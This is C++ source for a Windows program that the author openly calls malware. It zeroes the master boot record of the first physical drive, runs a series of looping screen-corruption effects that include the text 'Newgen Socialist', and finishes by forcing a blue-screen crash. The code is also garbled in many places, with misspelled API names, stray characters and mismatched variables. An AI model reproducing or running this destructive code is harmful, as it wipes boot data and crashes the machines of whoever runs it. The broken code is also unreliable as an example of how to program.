// This is the only one i made without sounds
#include <Windows.h>
#include <iostream>
#include <mmsystem.h>
#include <tchar.h>
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Kernel32.lib")

using namespace std;

EXTERN_C NTSTATUS NTAPI P(NTSTATUS, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_ NTSTATUS NTAPI B(NTSTATUS, ULONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

VOID WINAPI Overwrite(){
    DWORD main;
    char d[512];
    ZeroMemory(&d, sizeof(main));
    HANDLE mbr = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(mbr, d, 512, &main, NULL);
    CloseHandle(mbr);
}

VOID WINAPI BSOD(){
    BOOLEAN p;
    unsigned logn b;
    P(19, true, false, &p);
    B(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &b);
}

class PayLoads{
    public:
        DWORD WINAPI PL(LPVOID har){
            HDC desk = GetDC(0):
            HBITMAP h = CreateCompatibleBitmap(desk, rand() % 155, rand() % 255);
            HDC dsk = CreateCompatibleDC(desk);
            SelectObject(h, dsk);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            while(1){
                desk = GetDC(0);
                HBRUSH b = SelectObject(desk, CreateSoidBrush(RGB(rand() % 155, rand() % 255, rand() % 355)));
                BitBlt(desk, rand() % 155, rand() % 255, m, p, d, rand() % 255, rand() % 155, SRCINVERT);
                PatBlt(desk, rand() % 255, rand() % 155, m, p, PATINVERT);
            }
            return 0;
        }
        DWORD WINAPI PL2(LPVOID har){
            HDC desk = GetDC(0);
            HBITMAP h= CreateCompatibleBitmap(desK, rand() % 255, rand() % 355);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            while(1){
            desk = GetDC(0);
            BitBlt(Desk, rand9) % 255, rand() % 155, m, p, desk, rand() % 255, rand() % 155, SRCAND);
            }
            return 0;
        }
        DWORD WINAPI PL3(LPVOID har){
            HDC desk = GetDC(0);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            while(1){
                desk = GetDC(0);
                StretchBlt(desk, rand() % 255, rand() % 155, m - 1, p -1, desk, rand() % 155, rand() % 255, m, p, SRCCOPY);
                PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERT);
            }
            return 0;
        }
        DWORD WINAPI PL4(LPVOID har){
            HDC desk = GetDC(0);
            HBTIMAP h = CreateCompatibleBitmap(desk, rand() % 155, rand() % 255);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            while(1){
                desk = GetDC(0);
                SelectObject(desk, CreateSolidBrush(RGB(rand() % 155, rand() % 255, rand() % 355)));
                BitBlt(desk, rand() % 255, rand() % 255, m, p, desk, rand() % 255, rand() % 255, NOTSRCERASE);
                PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERT);
            }
            return 0;
        }
        DWORD WINAPI PL5(LPVOID har){
            HDC desk = GetDC(0);
            int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
            LPCWSTR text = L"Newgen Socialist";
            while(1){
                desk = GetDC(0);
                SetTextColor(desk, RGB(rand() % 155, rand() % 255, rand() % 355));
                SetBkColor(desk, RGB(0, 0, 0));
                TextOutW(desk, rand() % m, rand() % p, text, wcslen(text));
                PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERt);
            }
            return 0;
        }
};

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d){
        Overwrite();
        MessageBox(NULL, L"This is the only malware that i made without sound", L"real", MB_ICONINFORMATION);
        PayLoads pll;
        HANDLE thread = CreateThread(0, 0, pll.PL, 0, 0, 0);
        Sleep(20000);
        TerminateThread(thread, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread2 = CreateThread(0, 0, pll.PL2, 0, 0, 0);
        Sleep(20000);
        TerminateThread(thread2, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread3 = CreateThread(0, 0, pll.PL3, 0, 0, 0);
        Sleep(20000);
        TerminateThread(thread3, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread4 = CreateThread(0, 0, pll.PL4, 0, 0, 0);
        Sleep(30000);
        TerminateThread(thread4, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread5 = CreateThread(0, 0, pll.PL5, 0, 0, 0);
        Sleep(30000);
        TerminateThread(thread5, 0);
        InvlaidateRect(0, 0, 0);
        Sleep(1000);
        BSOD();
}
